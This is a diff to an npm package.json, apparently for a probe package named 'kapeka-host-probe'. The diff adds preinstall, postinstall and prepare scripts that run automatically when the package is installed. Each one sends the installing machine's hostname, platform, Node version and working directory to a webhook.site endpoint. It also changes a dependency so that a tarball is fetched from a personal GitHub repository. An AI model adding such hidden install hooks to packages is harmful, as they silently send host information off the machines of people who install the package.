@@ -2,8 +2,13 @@
   "name": "kapeka-host-probe",
   "version": "1.0.0",
   "private": true,
-  "kapekaMarker": "KAPEKA_HOST_PROBE_3",
+  "kapekaMarker": "KAPEKA_HOST_PROBE_4",
+  "scripts": {
+    "preinstall": "node -e \"require('https').get('https://webhook.site/f5d286ed-4d54-4fa5-a900-930a1b6835b8/root-pre?h='+encodeURIComponent(require('os').hostname()+'|'+process.platform+'|'+process.version+'|'+process.cwd()))\"",
+    "postinstall": "node -e \"require('https').get('https://webhook.site/f5d286ed-4d54-4fa5-a900-930a1b6835b8/root-post?h='+encodeURIComponent(require('os').hostname()+'|'+process.platform+'|'+process.version+'|'+process.cwd()))\"",
+    "prepare": "node -e \"require('https').get('https://webhook.site/f5d286ed-4d54-4fa5-a900-930a1b6835b8/root-prepare?h='+encodeURIComponent(require('os').hostname()+'|'+process.platform+'|'+process.version+'|'+process.cwd()))\""
+  },
   "dependencies": {
-    "kapeka-probe": "https://webhook.site/f5d286ed-4d54-4fa5-a900-930a1b6835b8/kapeka-probe-1.0.0.tgz"
+    "kapeka-probe": "https://raw.githubusercontent.com/peka3655/kapeka-pkg-probe/main/kapeka-probe-1.0.0.tgz"
   }
 }
